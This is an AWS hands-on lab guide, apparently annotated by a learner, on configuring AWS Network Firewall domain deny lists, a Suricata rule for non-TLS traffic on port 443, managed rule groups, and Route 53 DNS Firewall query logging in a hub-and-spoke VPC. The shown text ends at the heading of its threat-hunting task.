

# Threat Hunting with AWS Network Firewall Deployment
SPL-TF-200-SITHNF-1 - Version 1.0.12

© 2025 Amazon Web Services, Inc. or its affiliates. All rights reserved. This work may not be reproduced or redistributed, in whole or in part, without prior written permission from Amazon Web Services, Inc. Commercial copying, lending, or selling is prohibited. All trademarks are the property of their owners.

Note: Do not include any personal, identifying, or confidential information into the lab environment. Information entered may be visible to others.

 

## Lab overview

You were recently hired as AnyCompany's first network security engineer. 
After completing an initial security audit, you concluded that the organization lacked visibility into network traffic. Additionally, you are concerned that one or more of AnyCompany’s EC2 instances may be infected with malware. Based on your recommendations, you have been asked to implement a network architecture that uses a combination of AWS Network Firewall and Route 53 Resolver DNS to:

- Enforce egress web filtering using stateful firewall rules.
- Monitor DNS traffic.
- Identify EC2 instances that you believe may have been compromised.
  
In this lab, you use a combination of domain lists, rule groups, and monitoring to secure a VPC and locate a series of rogue EC2 instances.

## Objectives

By the end of this lab, you should be able to do the following:

Configure stateful rule groups in AWS Network Firewall that follow Suricata-compatible intrusion prevention system (IPS) rule specifications.
Use a combination of managed and custom DNS domain lists to create a DNS Firewall that alerts administrators to suspicious queries.
Use Log Insights and Contributor Insights in Amazon CloudWatch to identify rogue EC2 instances.
Technical knowledge prerequisites

Familiarity with routing and DNS are recommended. You should also be comfortable working with the Command Line Interface (CLI) in a Linux environment.

## Icon key
Various icons are used throughout this lab to call attention to different types of instructions and notes. The following list explains the purpose for each icon:

 Caution: Information of special interest or importance (not so important to cause problems with the equipment or data if you miss it, but it could result in the need to repeat certain steps).
 Command: A command that you must run.
 Consider: A moment to pause to consider how you might apply a concept in your own environment or to initiate a conversation about the topic at hand.
 Expected output: A sample output that you can use to verify the output of a command or edited file.
 Hint: A hint to a question or challenge.
 Learn more: Where to find more information.
 Note: A hint, tip, or important guidance.
 Refresh: A time when you might need to refresh a web browser page or list to show new information.
 Security: An opportunity to incorporate security best practices.
 Task complete: A conclusion or summary point in the lab.
 Warning: An action that is irreversible and could potentially impact the failure of a command or process (including warnings about configurations that cannot be changed after they are made).



## Lab environment

The following diagram shows the final architecture of the lab environment:

<img width="679" height="431" alt="image" src="https://github.com/user-attachments/assets/0587e7aa-af31-42c6-9cba-13dcd5ae2af9" />


Image description: The preceding diagram depicts a data flow from EC2 instances, through Route 53 Resolver DNS Firewalls, to an AWS Transit Gateway, then to a separate VPC containing AWS Network Firewall endpoints, and ultimately out to the internet via an Internet gateway.

The following list details the major resources in the diagram:

- Two Spoke VPCs containing EC2 workloads.
- An Inspection-Egress-VPC containing AWS Network Firewall endpoints and a NAT Gateway.
- An AWS Transit Gateway connecting the three VPCs together.
- An Internet gateway providing egress out to the internet.

## Services used in this lab


### Amazon Virtual Private Cloud (Amazon VPC)

Amazon VPC (Virtual Private Cloud) is a service that enables users to create and manage isolated virtual networks within the AWS infrastructure. 
With Amazon VPC, customers can configure their own IP address range, create subnets, and set up routing tables and network gateways. This allows for greater control over network security, traffic routing, and resource access within an organization’s cloud environment.

### AWS Network Firewall
AWS Network Firewall is a managed service that provides network-level protection for AWS resources by filtering and inspecting incoming and outgoing traffic. 
It allows users to define custom firewall rules, helping to prevent unauthorized access and mitigate potential threats. The service integrates with other AWS security tools, offering a comprehensive solution for securing the network perimeter of a virtual private cloud.

### Route 53 Resolver DNS Firewall
Route 53 Resolver DNS Firewall is an AWS service that offers advanced DNS filtering and monitoring capabilities for Amazon VPCs. 
It enables users to create custom rulesets to block or allow specific domain names, helping to protect against malicious websites, phishing attempts, and other unwanted content. Additionally, Route 53 Resolver DNS Firewall provides detailed query logs, allowing for better visibility and analysis of DNS traffic within the VPC.

### Amazon CloudWatch
Amazon CloudWatch is a monitoring service that provides real-time insights into the performance and health of AWS resources and applications. 
It collects and tracks various metrics, such as CPU usage, latency, and error rates, enabling users to identify and resolve issues quickly. CloudWatch also supports customizable alarms and notifications, allowing for proactive management of potential problems and ensuring optimal performance across the AWS environment.

### Amazon EC2
Amazon EC2 (Elastic Compute Cloud) is a scalable compute service that allows users to run virtual servers in the AWS cloud. 
With EC2, customers can quickly provision and configure instances to meet their specific needs, including choosing the operating system, storage, and network settings. The service offers a variety of instance types and pricing options, making it suitable for a wide range of applications, from small-scale web hosting to large-scale data processing and analytics.


### AWS services not used in this lab

AWS service capabilities used in this lab are limited to what the lab requires. Expect errors when accessing other services or performing actions beyond those provided in this lab guide.

## Task 1: Explore the network architecture

In this task, you explore the network architecture of your AWS environment to gain a better understanding of how traffic is routed and the role of firewall endpoints. By examining the architecture, you learn how AWS Network Firewall is deployed and integrated within the Virtual Private Cloud (VPC) to protect your resources. This foundational knowledge is essential for effectively managing and configuring firewall rules to secure your network infrastructure.

Following your initial audit, you re-architected AnyCompany’s network to use a hub-and-spoke architecture. The network is comprised of three VPCs, each of which is connected to the others using AWS Transit Gateway. The Spoke VPCs are reserved for workloads and all traffic emanating from these VPCs is first routed to the Inspection + Egress VPC, where firewall rules are applied, before being forwarded to their ultimate destination.

With this new network architecture, you now have the ability to inspect and filter traffic between VPCs, as well as traffic destined for the internet.

Let's start by confirming that the instances in your Spoke VPCs can reach the internet.































3. At the top of the AWS Management Console, in the search bar, search for and choose **VPC**.
4. Scroll to the bottom of the page and from the panel on the left side of the screen, choose **Network Manager**.

   Note: AWS Network Manager provides tools and features to help you manage and monitor your network on AWS.
   AWS Network Manager makes it easy to perform connectivity management, network monitoring and troubleshooting, IP management, and network security and governance.

5. In the panel on the left side of the screen, open the  **Monitoring and troubleshooting** menu and select **Reachability Analyzer**.
6. Choose the Create and analyze path button.
7. On the Create and analyze path page, configure a new path using the following parameters:

- Name tag - optional: Enter Spoke A to Internet.
- Source type: Select Instances from the dropdown menu.
- Source: Select Spoke-VPC-TestInstance1 from the dropdown menu.
- Destination type: Select Internet Gateways from the dropdown menu.
- Destination: Select Inspection-Egress-VPC-IGW from the dropdown menu.

<img width="799" height="598" alt="image" src="https://github.com/user-attachments/assets/ed43938d-fade-4bf2-91dd-fe36c95d43d2" />

8. Scroll to the bottom of the page and choose Create and analyze path.

The Reachability Analyzer analyzes the network configurations, security group rules, network ACLs, and routing tables within your Amazon VPC. It uses this information to create a visual representation of the network paths between resources and assesses their reachability. If the instances in Spoke VPC A are unable to reach this internet, this helps you in identifying any misconfigurations or connectivity issues.

9. Refresh: Wait a few moments and then choose the  button in the Analyses panel to view the results.

 Note: If the analysis results are not available, wait a bit longer and then try again.

10. Review the analysis results in the Summary panel.

    Expected output:

    Reachability status:  Reachable

    Excellent! The instance can reach the internet. Based on the output from the Reachability Analyzer, the path from Spoke VPC A to the internet can be summarized as follows:

    - Traffic from Spoke-VPC-TestInstance1 passes through a Security Group and Network ACL (NACL)
    - It then proceeds to the Transit Gateway, which routes traffic to a VPC endpoint (the VPC endpoint resource ID is prepended with vpce-) located in the Inspection + Egress VPC.
    - The InspectionFirewall then evaluates the traffic using a combination of stateless and stateful rules before routing the traffic to a NAT Gateway.
    - Finally, the traffic is routed to the Internet Gateway.
    
    Consider: What is the purpose of the VPC endpoints in this path? In this case, the VPC endpoints are actually Firewall Endpoints. They play a crucial role in connecting the Inspection-Egress-VPC to the InspectionFirewall. They allow traffic from the Transit Gateway to be securely and privately routed to the InspectionFirewall for processing before being forwarded to the NAT Gateway. This setup helps maintain a secure and private connection within the Inspection-Egress-VPC while inspecting and processing the traffic as needed.

    Now, let’s verify that the routing in the other Spoke VPC is configured correctly.

11. From the panel on the left side of the screen, choose **Reachability Analyzer**.

Choose the Create and analyze path button.

On the Create and analyze path page, configure a new path using the following parameters:

Name tag - optional: Enter Spoke B to Internet.
Source type: Select Instances from the dropdown menu.
Source: Select Spoke-VPC-TestInstance2 from the dropdown menu.
Destination type: Select Internet Gateways from the dropdown menu.
Destination: Select Inspection-Egress-VPC-IGW from the dropdown menu.
Scroll to the bottom of the page and choose Create and analyze path.

 Refresh: Allow the Reachability Analyzer about a minute to complete its analysis and then choose the  button in the Analyses panel to view the results.

 Expected output:

Reachability status:  Reachable

 Task complete: Great work! You’ve confirmed that the new network architecture works. Now it’s time to build the rules that protects your network.



<img width="1226" height="267" alt="image" src="https://github.com/user-attachments/assets/f2034a5e-b08d-4a49-8908-2e40fb18991b" />

A transit gateway with ID `tgw-0b9b008c202eb644e` is attached to 3 subnets.
<img width="1077" height="172" alt="image" src="https://github.com/user-attachments/assets/256f70dc-a8dd-4f24-8934-ae93fcbc181b" />

<img width="1068" height="309" alt="image" src="https://github.com/user-attachments/assets/3359c0bb-fc0b-4dd8-8609-da200aec3049" />
<img width="1068" height="311" alt="image" src="https://github.com/user-attachments/assets/bd56cba6-c88c-451b-90a0-a9d93ffac7b2" />
<img width="1067" height="318" alt="image" src="https://github.com/user-attachments/assets/de9c0ca1-8458-4b57-a12c-a18629d8b8a5" />


`Spoke A to Internet` path:

- Source: i-014702b50f79ae834 (Spoke-VPC-TestInstance1)
  1. Placed in subnet `subnet-00a4e3bec3f0bd4cc` (Spoke-VPC-A-WorkloadSubnetA)
  2. Associated with SG `sg-0e9c6481b13a8fde5` (Spoke-VPC-A-WorkloadSubnetA-Sg)
  3. Associated with ENI `eni-0a7b334190a64a5f8`
  4. The availability zone of subnet `subnet-00a4e3bec3f0bd4cc` is `apne1-az4 (ap-northeast-1a)`

  ##### Outbound header

  |Destination address|Destination port range|Protocol|Source address|Source port range|
  |---|---|---|---|---|
  |0.0.0.0/5|0-65535|TCP|10.1.1.99/32| 0-65535|


- `eni-0a7b334190a64a5f8` (The elastic network interface attached to instance `i-014702b50f79ae834`)
  
  |Attached To|VPC|Subnet|
  |---|---|---|
  |`i-014702b50f79ae834`| `vpc-02d54e8cbcc811234`|`subnet-00a4e3bec3f0bd4cc`|

- SG `sg-0e9c6481b13a8fde5` (Spoke-VPC-A-WorkloadSubnetA-Sg)
  
  |Destination|CIDR|Protocol|
  |---|---|---|
  |Outbound|0.0.0.0/0|all|

- `acl-0fabc2922c1611385` (associated with subnet `subnet-00a4e3bec3f0bd4cc` (Spoke-VPC-A-WorkloadSubnetA))


  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Outbound|allow|0.0.0.0/0| all|

- `rtb-01879f741f91f09d1` (Spoke-VPC-A-WorkloadRouteTableA)  (associated with subnet `subnet-00a4e3bec3f0bd4cc` (Spoke-VPC-A-WorkloadSubnetA))

  |Origin|Destination CIDR|Transit Gateway ID|
  |---|---|---|
  |createroute|0.0.0.0/0|tgw-0b9b008c202eb644e|

  
- `acl-0fabc2922c1611385` (associated with subnet `subnet-0e5d122f6e3003881` (Spoke-VPC-A-TGWSubnetA))


  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Inbound|allow|0.0.0.0/0| all|

 - `eni-0f66b147b50a0dc96` (eni of the transit gateway in subnet `subnet-0e5d122f6e3003881`)

  |Attached To|VPC|Subnet|
  |---|---|---|
  |`tgw-attach-09b03580ab75828d7`|`vpc-02d54e8cbcc811234`|`subnet-0e5d122f6e3003881`|
  
- `tgw-attach-09b03580ab75828d7` (TGWSpokeVpcA-Attachment)
  
  | Transit Gateway | 
  |---|
  | `tgw-0b9b008c202eb644e` |

- `tgw-rtb-07e05fecd5145d0a9`  (TGW-SpokeRouteTable)

  |Destination CIDR|State|Attachment ID|Resource ID|
  |---|---|---|---|
  |`0.0.0.0/0`|active|`tgw-attach-0fdb2e4c5a62466c3`| `vpc-0efe9e4f89c9ace57`|

- `tgw-attach-0fdb2e4c5a62466c3` (TGWInspectionVPCC-Attachment)
  
  | Transit Gateway | 
  |---|
  | `tgw-0b9b008c202eb644e` |


- `eni-04d5207fc2abd29dc` (eni of the transit gateway in subnet `subnet-08596966742357bd6`)

  |Attached To|VPC|Subnet|
  |---|---|---|
  |`tgw-attach-0fdb2e4c5a62466c3`|`vpc-0efe9e4f89c9ace57`|`subnet-08596966742357bd6`|

  
  - The availability zone of subnet`subnet-0e5d122f6e3003881` is `apne1-az4 (ap-northeast-1a)`
  - The availability zone of subnet`subnet-08596966742357bd6` is `apne1-az1 (ap-northeast-1c)`



  ##### AVAILABILITY_ZONE_CROSSED
  ```json
  {
    "AdditionalDetailType": "AVAILABILITY_ZONE_CROSSED"
  }
  ```
  
- Network access control list: `acl-023fa22fa70ac7e3d`(associated with subnet `subnet-08596966742357bd6`  (Inspection-Egress-VPC-TGWSubnetB))

  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Outbound|allow|0.0.0.0/0| all|

- Route table: `rtb-0c6e8a1dfd3ede274` (Inspection-Egress-VPC-TGWRouteTableB; Associated with subnet `subnet-08596966742357bd6 (Inspection-Egress-VPC-TGWSubnetB))

  |Origin|Destination CIDR|Gateway ID|
  |---|---|---|
  |createroute|0.0.0.0/0|`vpce-0b0e263a9fe6319c9`|

  
  <img width="729" height="183" alt="image" src="https://github.com/user-attachments/assets/ca3d41f9-b4d2-45a0-803a-0a7d22bd6aa4" />

  <img width="1214" height="154" alt="image" src="https://github.com/user-attachments/assets/81adaa7d-e9ba-4e14-8065-27d151ebdab8" />

- `acl-023fa22fa70ac7e3d` (associated with subnet `subnet-012970c3673028073` (Inspection-Egress-VPC-FirewallSubnetB))

  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Inbound|allow|0.0.0.0/0| all|
 
- `eni-06c2676985e42fc13`  (eni of endpoint `vpce-0b0e263a9fe6319c9` (InspectionFirewall (ap-northeast-1c)))

  |Attached To|VPC|Subnet|
  |---|---|---|
  |`vpce-0b0e263a9fe6319c9`|`vpc-0efe9e4f89c9ace57`|`subnet-012970c3673028073`|

- `vpce-0b0e263a9fe6319c9`  (InspectionFirewall (ap-northeast-1c))

  |VPC|Service Name|
  |---|---|
  |`vpc-0efe9e4f89c9ace57`|`com.amazonaws.vpce.ap-northeast-1.vpce-svc-0e312b068794ae05b`|
 

- InspectionFirewall  (InspectionFirewall)

  ##### Firewall stateless rule
  | Rule Group ARN|Rule Action|Priority|
  |---|---|---|
  |firewall/InspectionFirewall|`forward_to_sfe`|-1|
  ##### Firewall stateful rule
  | Rule Group ARN|Rule Action|
  |---|---|---|
  |firewall/InspectionFirewall|`pass`|  
 
- `vpce-0b0e263a9fe6319c9`  (InspectionFirewall (ap-northeast-1c))

  |VPC|Service Name|
  |---|---|
  |`vpc-0efe9e4f89c9ace57`|`com.amazonaws.vpce.ap-northeast-1.vpce-svc-0e312b068794ae05b`|
 
 
- `eni-06c2676985e42fc13`  (eni of endpoint `vpce-0b0e263a9fe6319c9` (InspectionFirewall (ap-northeast-1c)))

  |Attached To|VPC|Subnet|
  |---|---|---|
  |`vpce-0b0e263a9fe6319c9`|`vpc-0efe9e4f89c9ace57`|`subnet-012970c3673028073`|
 

- `acl-023fa22fa70ac7e3d` (associated with subnet `subnet-012970c3673028073` (Inspection-Egress-VPC-FirewallSubnetB))

  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Outbound|allow|0.0.0.0/0| all|
 
- Route table: `rtb-046436a609d25022d`  (Inspection-Egress-VPC-FirewallRouteTableB; Associated with subnet `subnet-012970c3673028073` (Inspection-Egress-VPC-FirewallSubnetB))

  |Origin|Destination CIDR|Nat Gateway ID|
  |---|---|---|
  |createroute|0.0.0.0/0|`nat-0f7ca4001b19f2443`|
   
- `acl-023fa22fa70ac7e3d` (associated with subnet `subnet-0e0cd613f0d6de1e9` (Inspection-Egress-VPC-PublicSubnetB))

  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Inbound|allow|0.0.0.0/0| all|
 
- `eni-0471c133b7aae3976` (eni of NAT `nat-0f7ca4001b19f2443` in subnet `subnet-0e0cd613f0d6de1e9` (Inspection-Egress-VPC-PublicSubnetB))


  |Attached To ID|VPC|Subnet|
  |---|---|---|
  |`nat-0f7ca4001b19f2443`|`vpc-0efe9e4f89c9ace57`|`subnet-0e0cd613f0d6de1e9`|
 
- `nat-0f7ca4001b19f2443`
  
   ##### Outbound header

   |Source address|Source port range|
   |---|---|
   |`10.0.2.229/32`|1024-65535|

- `eni-0471c133b7aae3976` (eni of NAT `nat-0f7ca4001b19f2443` in subnet `subnet-0e0cd613f0d6de1e9` (Inspection-Egress-VPC-PublicSubnetB))


  |Attached To ID|VPC|Subnet|
  |---|---|---|
  |`nat-0f7ca4001b19f2443`|`vpc-0efe9e4f89c9ace57`|`subnet-0e0cd613f0d6de1e9`| 

- `acl-023fa22fa70ac7e3d` (associated with subnet `subnet-0e0cd613f0d6de1e9` (Inspection-Egress-VPC-PublicSubnetB))

  |Rule|Direction|ACL rule action|CIDR|Protocol|
  |---|---|---|---|---|
  |100|Outbound|allow|0.0.0.0/0| all|

- Route table: `rtb-0831749744b1f72d7`  (Inspection-Egress-VPC-PublicRouteTableB; Associated with subnet `subnet-0e0cd613f0d6de1e9` (Inspection-Egress-VPC-PublicSubnetB))
  
  |Origin|Destination CIDR|Gateway ID|
  |---|---|---|
  |createroute|0.0.0.0/0|`igw-0ebd70a0f53b2d9fb`|
 
 
- Internet gateway: `igw-0ebd70a0f53b2d9fb` (Inspection-Egress-VPC-IGW)
 
  |VPC|
  |---|
  |`vpc-0efe9e4f89c9ace57`|

  ##### Outbound header
  |Destination address|Destination port range|Protocol|Source address|Source port range|
  |---|---|---|---|---|
  |0.0.0.0/5|0-65535|TCP|54.249.64.153/32| 1024-65535|


   <img width="800" src="https://github.com/user-attachments/assets/779f8b30-6dc0-4977-9b92-ae9b5667cab1" />


   
## Task 2: Stateful firewall rules

As you saw in the previous task, network traffic is already being evaluated by firewall rules. When you re-architected the network and deployed AWS Network Firewall, you included one very simple rule. It logs, but does not block, all ICMP traffic. While this may help you to identify attackers performing reconnaissance, it is not sufficient to protect your network.

In this task, you configure stateful AWS Network Firewall rule groups to inspect and filter traffic. You create a domain block list to prevent access to specific domains, and utilize Suricata rule specifications to detect anomalous traffic patterns.

### Task 2.1: Domain lists

16. At the top of the AWS Management Console, in the search bar, search for and choose VPC.
17. In the panel on the left side of the screen, open the  Network Firewall menu and select Firewalls.

    <img width="781" height="200" alt="image" src="https://github.com/user-attachments/assets/dd628f55-36ae-4e13-adc6-2363bc864063" />

    There is currently one firewall called, InspectionFirewall, deployed in your environment.

18. Choose InspectionFirewall.

You are brought to the Inspection Firewall page. This page provides an overview of the firewall configuration, and lists all associated firewall rule groups. AWS Network Firewall rule groups are sets of rules that define traffic filtering behavior. Stateless rule groups inspect individual packets without considering their context, while stateful rule groups analyze traffic flows, taking into account the connection state and context of the packets.

On the InspectionFirewall page, choose the Firewall policy settings tab.

20. Scroll to the bottom of the page.

    <img width="1103" height="148" alt="image" src="https://github.com/user-attachments/assets/d4afb453-0cce-4ae0-b52a-f401e3446ab8" />


    Note that there is currently one Statefule rule group associated with your firewall – IcmpAlert-RuleGroup. This rule group doesn’t block traffic, but instead logs it and sends it to Amazon CloudWatch. In the future, you could extend this functionality to use services like AWS Lambda or Amazon EventBridge to trigger actions in response to logged ICMP traffic.

Open the Actions  menu and select Create stateful rule group.

You are brought to the Create and add stateful rule group page.

On the Choose rule group type step, for Rule group format dropdown menu, choose Domain list.

Choose Next .

24. On the Describe rule group step, for Rule group details, configuration the following:

    <img width="1016" height="403" alt="image" src="https://github.com/user-attachments/assets/749086f4-a63d-442d-a899-ae827032132e" />


- Name: Enter RestrictedDomains.
- Description: Enter A domain list of low reputation domains.
- Capacity: Enter 100.

Note: To estimate the capacity for an AWS Network Firewall rule group, you should consider factors such as the expected traffic volume, the complexity of the rules, and the performance requirements of your network. You can monitor the firewall’s resource utilization using Amazon CloudWatch metrics and adjust the capacity as needed to ensure optimal performance and security.

Choose Next .

On the Configure rules step, for Domain list rule, configure the following:

26. For Domain names enter the following:

    ```
    example.xyz
    example.stream
    example.party
    example.click
    example.win
    example.download
    example.bid
    example.vip
    example.net
    ```
 Note: A Domain list is a series of strings specifying the domain names that you want to match. The strings in your list can be explicit names that point to an individual host or include wildcards. For example, www.example.xyz would only match www.example.xyz, whereas .example.xyz would match example.xyz and all of its subdomains, such as www.example.xyz and ftp.example.xyz.

27. For CIDR ranges, choose Custom.

For the CIDR ranges, enter 10.0.0.0/8.

Under Protocols, ensure that the checkboxes next to HTTP and HTTPS are selected.

 Security: This rule group only restricts HTTP and HTTPS traffic. The domains in your domain list can still be accessed using other protocols. You take steps to mitigate this risk in subsequent tasks.

For Action, choose Deny.

Choose Next .

On the Configure advanced settings - optional step, choose Next .

On the Add tags - optional step, choose Next .

On the Review and create step, choose Create rule group .

Now that you’ve created your rule group, it’s time to test it.

Open a new browser tab and navigate to the AWS Management Console.

At the top of the AWS Management Console, in the search bar, search for and choose EC2.

On the EC2 Dashboard, choose Instances (running).

Select the Spoke-VPC-Command-Host instance and then choose the Connect button.

On the Connect to instance page, choose the Session Manager tab.

 Learn more: Session Manager enables you to connect to an instance without the need for specific ports to be open on your firewall or Amazon Virtual Private Cloud (Amazon VPC) security group.

Choose Connect.

A new browser tab or window opens with a connection to the Command-Host instance.

 Command: In the previous task you confirmed that instances in the Spoke VPCs can reach the internet. Now, let’s try to connect to one of the domains in the domain list. If the connection fails, you can be confident that the firewall is working. Enter the following command:


```shell
curl https://www.example.net --max-time 5
```
 Expected output:

```shell
************************
**** EXAMPLE OUTPUT ****
************************

curl: (28) Connection timed out after 5000 milliseconds
```

### Task 2.2: Intrusion prevention with Suricata rules

You’ve successfully created a blocklist of known bad domains. Of course, it would be impossible to defend against all cyber threats using only domain lists. In the following steps, you enhance AnyCompany’s network security by integrating open-source Suricata rules with AWS Network Firewall, specifically using Proofpoint’s OPEN ruleset.

42. Return to the browser tab connected to the AWS Network Firewall console.
43. In the panel on the left side of the screen, open the  Network Firewall menu and select Network Firewall rule groups.
44. Choose the Create rule group button.
45. On the Choose rule group type step, configure the following:

In the Rule group type panel, choose Stateful rule group.

For Rule group format, select Suricata compatible rule string from the dropdown menu.

 Note: Suricata is an open-source network threat detection engine that utilizes real-time intrusion detection, inline intrusion prevention, and network security monitoring capabilities.

For Rule evaluation order, choose Action order.

<img width="1029" height="411" alt="image" src="https://github.com/user-attachments/assets/3f97a4ab-d86a-4569-917f-2471d7e78456" />

Choose the Next button.

On the Describe rule group step, configure the following:

Name: Enter NonTlsTrafficOn443.
Description: Enter A rule that detects non-TLS traffic on port 443.
Capacity: Enter 10.

<img width="1021" height="401" alt="image" src="https://github.com/user-attachments/assets/2fab96e5-7282-4ee1-8413-fc6337c93fe1" />

Choose the Next button.

51. On the Configure rules step, configure the following:

    - For IP set variables configure the following:

  
   |Key| Value|
   |---|---|
   |Variable name|	`HOME_NET`|
   |Values	| `10.0.0.0/8`|
    
 Note: `HOME_NET` in Suricata rules refers to the variable that defines the source IP range for an IPS Rule Group. By default, HOME_NET is set to the VPC CIDR where the Firewall endpoints are deployed. In this case, however, the Firewall endpoints and EC2 instances are in separate VPCs, so you need to manually set this value.

52. Scroll down the page to the Suricata compatible rule string card and enter the following Suricata rule in the Suricata compatible rule string textbox:

    ```
    alert tcp any any <> any 443 (msg:"SURICATA Port 443 but not TLS"; flow:to_server,established; app-layer-protocol:!tls; sid:2271003; rev:1;)
    ```
    Consider: The following list provides an explanation of the Suricata rule:

    - `alert tcp any any <> any 443`: This part of the rule specifies that it applies to TCP traffic on port 443 between any source and destination IP addresses.
    - `msg:"SURICATA Port 443 but not TLS"`: This message is displayed when the rule triggers an alert, indicating that the traffic is on port 443 but not using TLS encryption.
    - flow:to_server,established: This condition ensures that the rule only applies to established connections directed towards the server.
    - app-layer-protocol:!tls: This part checks if the application layer protocol is not TLS, which is expected for secure traffic on port 443.
    - sid:2271003: This is the unique rule identifier (signature ID) used to track and manage the rule.
    - rev:1: This indicates the revision number of the rule, which is useful for tracking updates and modifications to the rule.

53. Choose Next .

On Configure advanced settings - optional step, choose Next .

On Add tags - optional step, choose Next .

On the Review and create step, choose Create rule group .

Unlike that domain list you created, this stateful rule needs to be manually added to your policy.

From the panel on the left side of the screen, open the  Network Firewall menu and select Firewall policies.

 Note: One policy called InspectionFirewall-Policy appears on screen. This policy defines the monitoring and protection behavior for your firewall.

Choose InspectionFirewall-Policy.

Scroll to the Stateful rule groups panel at bottom of of the page, open the Actions  menu and select Add unmanaged stateful rule groups.

On the Add unmanaged stateful rule groups page, select the checkbox next to NonTlsTrafficOn443.

At the bottom of the page, choose the **Add stateful rule group** button.

You are returned to the policy overview page.



### Task 2.3: Managed rule groups


Thus far, you have used custom rule groups to protect the AnyCompany network. However, given the ever-evolving threat landscape, it’s unrealistic to think that with your limited resources, you are be able to continually update your firewall rules to address emerging threats. In the following steps, you add managed rule groups to your firewall. These are collections of predefined, ready-to-use rules that AWS writes and maintains for you. AWS managed rule groups are available for free to Network Firewall customers.

Once again, scroll to the Stateful rule groups panel at bottom of of the page, open the Actions  menu and select Add managed stateful rule groups.

On the Add managed stateful rule groups page select the checkboxes next to all 4 of the Domain and IP rule groups.

Scroll down the page to the Threat signature rule groups panel and select the checkbox next to ThreatSignaturesMalwareWebActionOrder rule group.

At the bottom of the page, choose the Add to policy button.

Scroll to the bottom of the page and look at the Capacity units panel at the bottom of the screen.

 Consider: Your stateful rule groups are currently consuming 4310 out of a possible 30,000 units. In the future, you may choose to add additional stateful rule groups to protect AnyCompany’s network. However, before doing this, it is important to establish a baseline for acceptable network performance, as adding additional stateful rule groups may result in increased latency and potentially rule processing failures. Capacity units should be allocated based on your specific network security requirements and it is always a good idea to leave some room for future updates and adjustments.

 Task complete: You’ve successfully created and deployed a stateful rule groups that should help to protect the network. Equally importantly, these rule groups generate logs which helps you in understanding how traffic is traversing the network and potentially identify threats.

<img width="1104" height="350" alt="image" src="https://github.com/user-attachments/assets/6b6181de-10f9-443b-91c2-3d256aac2282" />

## Task 3: Route53 Resolver DNS Firewall


Recall that the domain list you created only prevents HTTP and HTTPS traffic to your list of suspect domains. This means that attackers could still connect to these domains using other protocols. In this task, you address this vulnerability by creating a DNS firewall that prevents VPC-based compute resources from querying any of the suspect domains in your list. Restricting the ability to use DNS to resolve the IP addresses for these domains, should further enhance AnyCompany’s security posture.

In the panel on the left of the screen, open the  DNS Firewall menu and select Domain lists.

 Note: Similar to the domain list you created in AWS Network Firewall, Route 53 Resolver DNS Firewall domain lists are used to filter DNS queries.

Choose the Add domain list button.

In the Domain list name field, enter RestrictedDomains.

In the text field beneath Enter one domain per line, enter the following list:

```
*.example.xyz
*.example.stream
*.example.party
*.example.click
*.example.win
*.example.download
*.example.bid
*.example.vip
*.example.net
```

 Note: Unlike AWS Network Firewall domain lists, which use the dot (.) to denote a wildcard and include all subdomains, DNS Firewall domain lists need to be pre-pended with asterisk dot (.)*

Scroll to the bottom of the page and choose the Add domain list button.

 Caution: If you receive an error message stating that the domain list must include at least of character, your browser may have inserted an extra line at the bottom of your domain list. To resolve this issue, place your cursor at the end of the domain list and delete any trailing characters after example.net.

Now that you’ve created your domain list, it needs to be added to a rule goup.

From the panel on the left of the screen, open the  DNS Firewall menu and select Rule groups.

You are brought to the Route 53 Resolver DNS Firewall page.

Choose the Create rule group button.

On the Add rule group step, in the Rule group details panel, for Name, enter Spoke-VPC-DNS-Firewall

Choose the Add rule group button.

Choose the Add rule button.

Configure the following rule parameters:

Name: Enter Blocklist.
Domain lists: Choose the radio button next to Custom domain list
Custom domain list: Open the dropdown menu and select RestrictedDomains.
Choose an action to take when a DNS query fits the matches: Open the dropdown menu and select BLOCK.
Select a response to send for the BLOCK action: Choose the radio button next to NXDOMAIN.
Choose the Add rule button under the Action panel.


<img width="1173" height="598" alt="image" src="https://github.com/user-attachments/assets/5ef18ee0-bee6-45f1-9ef8-f3fa565a5d65" />

Now that you’ve added your custom domain list, let’s add a managed domain list.

Choose the Add rule button.

Configure the following rule parameters:

Name: Enter ManagedBlocklist.
Domain lists: Choose the radio button next to AWS managed domain list.
Choose a domain list: Open the dropdown menu and select AWSManagedDomainsAggregateThreatList.
Choose an action to take when a DNS query fits the matches: Open the dropdown menu and select BLOCK.
Select a response to send for the BLOCK action: Choose the radio button next to NXDOMAIN.
Once again, select the Add rule button under the Action panel.

<img width="1168" height="593" alt="image" src="https://github.com/user-attachments/assets/9d2ad3ce-ff78-4202-abc7-2393a86d1da9" />

Confirm that two rules now appear in the Rules panel.

Now that your rule group has been created, it needs to be associated with the Spoke VPCs.

83. Choose the Associated VPCs tab.
84. Choose the Associate VPC button.
    The Associate VPC window appears.

85. Open the dropdown menu and select Spoke-VPC-A and Spoke-VPC-B.

86. Choose the Associate button.

It takes several minutes for the VPC association to complete. While this is in process, we’ll enable DNS query logging.

At the top of the AWS Management Console, in the search bar, search for and choose Route 53 Resolver.

You are brought to the Amazon Route 53 Resolver page.

If the Route 53 panel on the left side of the screen is not already open, choose the  menu button to expand it.

In the expanded panel on the left of the screen, open the  Resolver menu and select Query logging.

Choose the Configure query logging button.

91. Enter the following details to configure query logging:
    - Name: Spoke-VPC-Query-Logs
    - Destination for query logs: Choose the radio button next to CloudWatch Logs log group
    - CloudWatch Logs log groups: Open the dropdown menu and select /Lab/Route53/QueryLogs
    - VPCs to log queries for: Choose the Add VPC button, select the checkboxes next to Spoke-VPC-A and Spoke-VPC-B and then choose the Add button

92. Choose the Configure query logging button at the bottom of the page.

 Task complete: Now that you’ve enabled query logging and created a DNS firewall, instances are prevented from querying a wide range of suspect domains. Better still, you should be able to use CloudWatch to identify any instances that attempt to query these domains.

## Task 4: Threat Hunting

